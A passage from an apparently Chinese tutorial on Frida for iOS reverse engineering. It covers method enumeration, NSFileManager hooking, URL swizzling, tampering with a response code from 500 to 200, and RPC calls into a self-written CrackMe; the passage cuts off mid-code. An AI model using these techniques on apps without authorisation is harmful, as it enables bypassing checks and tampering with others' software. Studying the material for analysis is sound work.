objc，如果是查找 C 函数，ApiResolver 参数中填写 module，然后调用 enumerateMatches 枚举函数，每次枚举到一个函数会调用一次 onMatch，回调参数 match 包含 name 和 address 两个属性，分别代表名称和地址。整个枚举过程完成之后会调用 onComplete，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> resolver = <span class="hljs-keyword">new</span> ApiResolver(<span class="hljs-string">&#x27;objc&#x27;</span>);<br>resolver.enumerateMatches(<span class="hljs-string">&#x27;*[NSFileManager *]&#x27;</span>, &#123;<br>   <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>&#123;<br>      <span class="hljs-built_in">console</span>.log(match[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-string">&quot;:&quot;</span> + match[<span class="hljs-string">&#x27;address&#x27;</span>]);<br>   &#125;,<br>   <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>附加 Safari 浏览器并加载脚本，会打印出 NSFileManager 所有的方法。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js">frida -U -l hook_objc.js <span class="hljs-string">&quot;Safari 浏览器&quot;</span><br>-[NSFileManager dealloc]:<span class="hljs-number">0x1e2324034</span><br>-[NSFileManager setDelegate:]:<span class="hljs-number">0x1e23b2744</span><br>-[NSFileManager delegate]:<span class="hljs-number">0x1e2333ab8</span><br>-[NSFileManager _info]:<span class="hljs-number">0x1e2333ae0</span><br>-[NSFileManager removeItemAtURL:error:]:<span class="hljs-number">0x1e235583c</span><br>-[NSFileManager copyItemAtURL:toURL:error:]:<span class="hljs-number">0x1e23b2ab0</span><br>-[NSFileManager fileExistsAtPath:isDirectory:]:<span class="hljs-number">0x1e2301d50</span><br>-[NSFileManager fileExistsAtPath:]:<span class="hljs-number">0x1e22e5398</span><br>-[NSFileManager setAttributes:ofItemAtPath:error:]:<span class="hljs-number">0x1e23180bc</span><br>-[NSFileManager removeItemAtPath:error:]:<span class="hljs-number">0x1e23336bc</span><br>-[NSFileManager enumeratorAtPath:]:<span class="hljs-number">0x1e2326024</span><br>-[NSFileManager isWritableFileAtPath:]:<span class="hljs-number">0x1e23240dc</span><br>-[NSFileManager moveItemAtPath:toPath:uniquePath:error:]:<span class="hljs-number">0x1ec6f4ec4</span><br>-[NSFileManager copyItemAtPath:toPath:uniquePath:error:]:<span class="hljs-number">0x1ec6f4ed4</span><br>......<br></code></pre></td></tr></table></figure><p>得到方法名称之后，我们可以把感兴趣的找出来，然后调用拦截器（Interceptor）进行 Hook ，比如我们需要做一个简易的文件监控的功能，监控某个进程操作了哪些文件，文件操作的相关的方法会调用 removeItemAtPath、moveItemAtPath、copyItemAtPath、createFileAtPath、createDirectoryAtPath、enumeratorAtPath、contentsOfDirectoryAtPath，分别代表删除文件、移动文件、复制文件、创建文件、创建目录、枚举目录（包括子目录），枚举目录（不包括子目录），具体代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> resolver = <span class="hljs-keyword">new</span> ApiResolver(<span class="hljs-string">&#x27;objc&#x27;</span>);<br>resolver.enumerateMatches(<span class="hljs-string">&#x27;*[NSFileManager *]&#x27;</span>, &#123;<br>   <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> method = match[<span class="hljs-string">&#x27;name&#x27;</span>];<br>      <span class="hljs-keyword">var</span> implementation = match[<span class="hljs-string">&#x27;address&#x27;</span>];<br><br>      <span class="hljs-comment">// 过滤需要拦截的方法</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-comment">//(method.indexOf(&quot;fileExistsAtPath&quot;) != -1) </span><br>         (method.indexOf(<span class="hljs-string">&quot;removeItemAtPath&quot;</span>) != -<span class="hljs-number">1</span>)<br>        || (method.indexOf(<span class="hljs-string">&quot;moveItemAtPath&quot;</span>) != -<span class="hljs-number">1</span>)<br>        || (method.indexOf(<span class="hljs-string">&quot;copyItemAtPath&quot;</span>) != -<span class="hljs-number">1</span>)<br>        || (method.indexOf(<span class="hljs-string">&quot;createFileAtPath&quot;</span>) != -<span class="hljs-number">1</span>)<br>        || (method.indexOf(<span class="hljs-string">&quot;createDirectoryAtPath&quot;</span>) != -<span class="hljs-number">1</span>)<br>        || (method.indexOf(<span class="hljs-string">&quot;enumeratorAtPath&quot;</span>) != -<span class="hljs-number">1</span>)<br>        || (method.indexOf(<span class="hljs-string">&quot;contentsOfDirectoryAtPath&quot;</span>) != -<span class="hljs-number">1</span>)) &#123;<br><br>         <span class="hljs-built_in">console</span>.log(match[<span class="hljs-string">&#x27;name&#x27;</span>] + <span class="hljs-string">&quot;:&quot;</span> + match[<span class="hljs-string">&#x27;address&#x27;</span>]);<br>         <span class="hljs-keyword">try</span> &#123;<br>            Interceptor.attach(implementation, &#123;<br>               <span class="hljs-attr">onEnter</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;<br><br>                  <span class="hljs-keyword">var</span> className = ObjC.Object(args[<span class="hljs-number">0</span>]);<br>                  <span class="hljs-keyword">var</span> methodName = args[<span class="hljs-number">1</span>];<br>                  <span class="hljs-keyword">var</span> filePath = ObjC.Object(args[<span class="hljs-number">2</span>]);<br><br>                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;className: &quot;</span> + className.toString());<br>                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;methodName: &quot;</span> + methodName.readUtf8String());<br>                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;filePath: &quot;</span> + filePath.toString());<br>                 <br>               &#125;,<br>               <span class="hljs-attr">onLeave</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) </span>&#123;<br>                  <br>               &#125;<br>            &#125;);<br>         &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[!] Exception: &quot;</span> + err.message);<br>         &#125;<br>      &#125;<br><br>   &#125;,<br>   <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>   &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>附加 SpringBoard 并加载脚本，然后我们操作卸载某个应用，此时会打印出相关的文件操作的路径，从下面打印的信息中我们可以看到卸载某个应用时，SpringBoard 进程对文件的操作过程，会删除 /var/mobile/Library/UserNotifications 和应用的沙盒目录。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js">frida -U -l hook_objc.js SpringBoard<br>[iPhone::SpringBoard]-&gt; <br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: removeItemAtPath:error:<br>filePath: /var/mobile/Library/UserNotifications/com.360buy.jdmobile/Attachments<br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: filesystemItemRemoveOperation:shouldRemoveItemAtPath:<br>filePath: &lt;NSFilesystemItemRemoveOperation: 0x283674f40&gt;<br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: enumeratorAtPath:<br>filePath: /private/var/mobile/Containers/Data/Application/C8A23CD4-6857-4BF4-876E-7FD104B0E799/Library/Caches/Snapshots/com.360buy.jdmobile<br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: removeItemAtPath:error:<br>filePath: /private/var/mobile/Containers/Data/Application/C8A23CD4-6857-4BF4-876E-7FD104B0E799/Library/Caches/Snapshots/com.360buy.jdmobile<br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: filesystemItemRemoveOperation:shouldRemoveItemAtPath:<br>filePath: &lt;NSFilesystemItemRemoveOperation: 0x283677e80&gt;<br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: removeItemAtPath:error:<br>filePath: /private/var/mobile/Containers/Data/Application/C8A23CD4-6857-4BF4-876E-7FD104B0E799/Library/Caches/Snapshots<br>className: &lt;NSFileManager: 0x282954250&gt;<br>methodName: filesystemItemRemoveOperation:shouldRemoveItemAtPath:<br>filePath: &lt;NSFilesystemItemRemoveOperation: 0x283677e80&gt;<br>.......<br></code></pre></td></tr></table></figure><p>比如需要拦截 NSFileManager 类的所有方法，但是排除某些方法，代码可以这样写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> resolver = <span class="hljs-keyword">new</span> ApiResolver(<span class="hljs-string">&#x27;objc&#x27;</span>);<br>resolver.enumerateMatches(<span class="hljs-string">&#x27;*[NSFileManager *]&#x27;</span>, &#123;<br>   <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> method = match[<span class="hljs-string">&#x27;name&#x27;</span>];<br>      <span class="hljs-keyword">var</span> implementation = match[<span class="hljs-string">&#x27;address&#x27;</span>];<br><br>      <span class="hljs-comment">// 过滤不需要拦截的方法，其他方法全部拦截</span><br>      <span class="hljs-keyword">if</span> (method.indexOf(<span class="hljs-string">&quot;dealloc&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>         <span class="hljs-comment">//进行 Hook</span><br>         <span class="hljs-comment">//......</span><br>      &#125;<br>   &#125;,<br>&#125;);<br></code></pre></td></tr></table></figure><p>接下来我们来学习 API 查找器如何查找 C 函数，有 3 种方式，格式参考如下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">format i<span class="hljs-variable">s:</span> export<span class="hljs-variable">s:</span>*!open*, export<span class="hljs-variable">s:libc</span>.so!* <span class="hljs-built_in">or</span> import<span class="hljs-variable">s:notepad</span>.exe!*<br></code></pre></td></tr></table></figure><p>比如我们查找 fopen 函数，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> resolver = <span class="hljs-keyword">new</span> ApiResolver(<span class="hljs-string">&#x27;module&#x27;</span>);<br>resolver.enumerateMatches(<span class="hljs-string">&#x27;exports:*!fopen*&#x27;</span>, &#123;<br>    <span class="hljs-attr">onMatch</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">match</span>) </span>&#123;<br><br>         <span class="hljs-keyword">var</span> name = match[<span class="hljs-string">&#x27;name&#x27;</span>];<br>         <span class="hljs-keyword">var</span> address = match[<span class="hljs-string">&#x27;address&#x27;</span>];<br>         <span class="hljs-built_in">console</span>.log(name + <span class="hljs-string">&quot;:&quot;</span> + address);<br><br>    &#125;,<br>    <span class="hljs-attr">onComplete</span>: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;&#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>附加 SpringBoard 加载脚本之后，打印如下信息，名称包括了动态库的路径，此时得到函数地址，就可以调用拦截器进行 Hook。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">frida -U -l hook_objc.js SpringBoard<br>[iPhone::SpringBoard]-&gt; <br><span class="hljs-regexp">/usr/</span>lib/libSystem.B.dylib!fopen:<span class="hljs-number">0x1e145d4d0</span><br>/usr/lib/libSystem.B.dylib!fopen$DARWIN_EXTSN:<span class="hljs-number">0x1e1495d04</span><br>/usr/lib/system/libsystem_c.dylib!fopen$DARWIN_EXTSN:<span class="hljs-number">0x1e1495d04</span><br>/usr/lib/system/libsystem_c.dylib!fopen:<span class="hljs-number">0x1e145d4d0</span><br>/usr/lib/libSystem.B.dylib!fopen:<span class="hljs-number">0x1e145d4d0</span><br>/usr/lib/libSystem.B.dylib!fopen$DARWIN_EXTSN:<span class="hljs-number">0x1e1495d04</span><br></code></pre></td></tr></table></figure><p>Objective-C 除了调用拦截器进行 Hook，还可以使用替换 implementation 的方式，类似于苹果提供的一套  Method Swizzling Hook 的方式，比如 Hook +[NSURL URLWithString:] 的例子如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> method = ObjC.classes.NSURL[<span class="hljs-string">&#x27;+ URLWithString:&#x27;</span>];<br><span class="hljs-keyword">var</span> origImp = method.implementation; <br>method.implementation = ObjC.implement(method, <span class="hljs-function"><span class="hljs-keyword">function</span>  (<span class="hljs-params">self, sel, url</span>)</span>&#123;  <br><br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;+ [NSURL URLWithString:]&quot;</span>);<br>      <span class="hljs-keyword">var</span> urlString = ObjC.Object(url);<br>      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;url: &quot;</span> + urlString.toString());<br><br>      <span class="hljs-keyword">return</span> origImp(self, sel, url);   <span class="hljs-comment">//调用原方法，如果不调用则原方法得不到执行</span><br><br>                        <span class="hljs-comment">//替换参数，将 URL 替换成 http://www.ioshacker.net</span><br>      <span class="hljs-comment">//var newUrl = ObjC.classes.NSString.stringWithString_(&quot;http://www.ioshacker.net&quot;);</span><br>      <span class="hljs-comment">//return origImp(self, sel, newUrl);  </span><br><br>&#125;); <br></code></pre></td></tr></table></figure><h4 id="9-NSData与BASE64互转"><a href="#9-NSData与BASE64互转" class="headerlink" title="9. NSData与BASE64互转"></a>9. NSData与BASE64互转</h4><p>NSData转BASE64</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> NSData = <span class="hljs-keyword">new</span> ObjC.Object(args[<span class="hljs-number">3</span>]);<br><span class="hljs-keyword">var</span> BASE64NSData =  NSData[<span class="hljs-string">&#x27;- base64EncodedDataWithOptions:&#x27;</span>].call(NSData,<span class="hljs-number">0</span>)<br><span class="hljs-comment">//NSString *baseString = [[NSString alloc]initWithData:base64Data encoding:NSUTF8StringEncoding];</span><br><span class="hljs-keyword">var</span> NSString = ObjC.classes.NSString.alloc();<br><span class="hljs-keyword">var</span> ret =NSString[<span class="hljs-string">&#x27;- initWithData:encoding:&#x27;</span>].call(NSString,BASE64NSData,<span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><p>BASE64转NSData</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> base64String=<span class="hljs-string">&quot;/9j/4AAQSkZJR&quot;</span><br><span class="hljs-keyword">var</span> BASE64NSString = ObjC.classes.NSString.stringWithString_(base64String);<br><span class="hljs-keyword">var</span> NSData = ObjC.classes.NSData.alloc();<br><span class="hljs-comment">//NSData *data = [[NSData alloc]initWithBase64EncodedString:BASE64NSString options:NSDataBase64DecodingIgnoreUnknownCharacters];</span><br><span class="hljs-keyword">var</span> ret = NSData[<span class="hljs-string">&#x27;- initWithBase64EncodedString:options:&#x27;</span>].call(NSData,BASE64NSString,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h4 id="10-修改NSDictionary数据"><a href="#10-修改NSDictionary数据" class="headerlink" title="10.修改NSDictionary数据"></a>10.修改NSDictionary数据</h4><p>假如NSDictionary数据为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-string">&quot;fail&quot;</span>,<span class="hljs-attr">&quot;code&quot;</span>:<span class="hljs-number">500</span>&#125;<br></code></pre></td></tr></table></figure><p>修改code字段500为200</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//result为传入的NSDictionary对象</span><br><span class="hljs-keyword">var</span> NSMutableDictionaryResult =   ObjC.classes.NSMutableDictionary.dictionaryWithDictionary_(result);<span class="hljs-comment">//转为NSMutableDictionary</span><br><span class="hljs-keyword">var</span> code = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;code&quot;</span>);<br><span class="hljs-keyword">var</span> codeNum = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;200&quot;</span>);<br>NSMutableDictionaryResult.setValue_forKey_(codeNum,code); <span class="hljs-comment">//更改500-&gt;200</span><br><span class="hljs-built_in">console</span>.log(NSMutableDictionaryResult)<br></code></pre></td></tr></table></figure><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>远程过程调用（RPC）对于应用逆向起到了很便捷的作用，比如目标应用有一个加解密的函数内部实现非常复杂，想分析整个加解密的实现过程的工作量较大，此时可以使用 frida 的 RPC 功能，只要知道加解密函数的名称或地址，还有相应的参数，即可直接调用得到加解密后的结果。<br>下面我们来做一个实例，编写一个 CrackMe 程序，定义一个 coreClass 类，里面有 4 个比较重要的方法，分别是 getDeviceId、httpPost、encrypt、decrypt，从它们的名称可以看出大概的意思，具体的定义如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js">@interface coreClass : NSObject<br>@end<br><br>@implementation coreClass<br><br>- (NSString*)getDeviceId&#123;<br>    <span class="hljs-keyword">return</span> @<span class="hljs-string">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>;<br>&#125;<br><br>+(NSString*)httpPost:(NSString*)url&#123;<br>    NSLog(@<span class="hljs-string">&quot;URL: %@&quot;</span>, url);<br>    <span class="hljs-keyword">return</span> @<span class="hljs-string">&quot;test&quot;</span>;<br>&#125;<br><br>- (NSString*)encrypt:(NSData*)data :(NSString*)key&#123;<br>    <br>    NSLog(@<span class="hljs-string">&quot;data: %@&quot;</span>, data);<br>    NSLog(@<span class="hljs-string">&quot;key: %@&quot;</span>, key);<br>    <span class="hljs-keyword">return</span> @<span class="hljs-string">&quot;encrypt successed!&quot;</span>;<br>&#125;<br><br>- (NSString*)decrypt:(NSString*)str :(NSString*)key&#123;<br>    NSLog(@<span class="hljs-string">&quot;str: %@&quot;</span>, str);<br>    NSLog(@<span class="hljs-string">&quot;key: %@&quot;</span>, key);<br>    <span class="hljs-keyword">return</span> @<span class="hljs-string">&quot;decrypt successed!&quot;</span>;<br>&#125;<br>@end<br></code></pre></td></tr></table></figure><p>下面我们要做的事情是在 JS 脚本里去调用这 4 个方法。Objective-C 方法有两种，一种是 - 号开头，称为对象方法，还有一种是 + 号开头，称为类方法，前者需要初始化一个实例才能调用，后者不需要初始化实例，可以直接调用。先来看看对象方法在 JS 脚本里如何调用，比如我们要调用 -[coreClass getDeviceId] 方法，调用的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass.alloc();<br><span class="hljs-keyword">var</span> deviceId = coreClass[<span class="hljs-string">&#x27;- getDeviceId&#x27;</span>].call(coreClass);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;deviceId: &quot;</span> + deviceId.toString());<br></code></pre></td></tr></table></figure><p>再来看看 +[coreClass httpPost:] 方法的调用，从下面的代码可以看出，类方法是不需要初始化实例，在方法名称后面加上一个 _ 号就可以调用了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass;<br><span class="hljs-keyword">var</span> url = ObjC.classes.NSURL.URLWithString_(<span class="hljs-string">&quot;http://www.ioshacker.net&quot;</span>);<br><span class="hljs-keyword">var</span> retString =  coreClass.httpPost_(url);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;retString: &quot;</span> + retString);<br></code></pre></td></tr></table></figure><p>-[coreClass encrypt::] 的调用代码如下，输入的参数有两个，一个参数是 NSData 类型的，一个是 NSString 类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass.alloc();<br><span class="hljs-keyword">var</span> str = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;test&quot;</span>);<br><br><span class="hljs-comment">//NSData *data = [@&quot;data&quot; dataUsingEncoding:NSUTF8StringEncoding];</span><br><span class="hljs-keyword">var</span> data = str.dataUsingEncoding_(<span class="hljs-number">4</span>);<br><span class="hljs-keyword">var</span> key = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;key&quot;</span>);<br><br><span class="hljs-keyword">var</span> encryptString = coreClass[<span class="hljs-string">&#x27;- encrypt::&#x27;</span>].call(coreClass, data, key);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;encryptString: &quot;</span> + encryptString);<br></code></pre></td></tr></table></figure><p>-[coreClass decrypt::] 的调用代码如下，两个参数都是 NSString 类型。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass.alloc();<br><span class="hljs-keyword">var</span> str = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-keyword">var</span> key = ObjC.classes.NSString.stringWithString_(<span class="hljs-string">&quot;key&quot;</span>);<br><span class="hljs-keyword">var</span> decryptString = coreClass[<span class="hljs-string">&#x27;- decrypt::&#x27;</span>].call(coreClass, str, key);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;decryptString: &quot;</span> + decryptString);<br></code></pre></td></tr></table></figure><p>在上面我们已经学会如何在 JS 脚本里调用目标应用的 Objective-C 方法，接下面要做的就是将功能代码导出提供给 Python 使用。在 JS 代码里定义4个函数，分别是 getDeviceId、httpPost、encrypt、decrypt，这 4 个函数分别代表了调用目标进程的 4 个 Objective-C 方法，然后再使用 rpc.exports 将这 4 个函数导出，代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getDeviceId</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass.alloc();<br>        <span class="hljs-keyword">var</span> deviceId = coreClass[<span class="hljs-string">&#x27;- getDeviceId&#x27;</span>].call(coreClass);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;deviceId: &quot;</span> + deviceId.toString());<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;--------------------&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">httpPost</span>(<span class="hljs-params">inputurl</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass;<br>        <span class="hljs-keyword">var</span> url = ObjC.classes.NSURL.URLWithString_(inputurl);<br>        <span class="hljs-keyword">var</span> retString =  coreClass.httpPost_(url);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;retString: &quot;</span> + retString);<br>        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;--------------------&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encrypt</span>(<span class="hljs-params">inputstr, inputkey</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> coreClass = ObjC.classes.coreClass.alloc();<br>        <span class="hljs-keyword">var</span> str = ObjC.classes.NSString.stringWithString_(inputstr);<br><br>        <span class="hljs-comment">//NSData *data = [@&quot;data&quot; dataUsingEncoding:NSUTF8StringEncoding];</span><br>        <span class="hljs-keyword">var</span> data = str.dataUsingEncoding_(<span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">var</span> key = ObjC.classes.NSString.stringWithString_(inputkey);<br><br>        <span class="hljs-keyword">var</span> encryptString = coreClass[<span 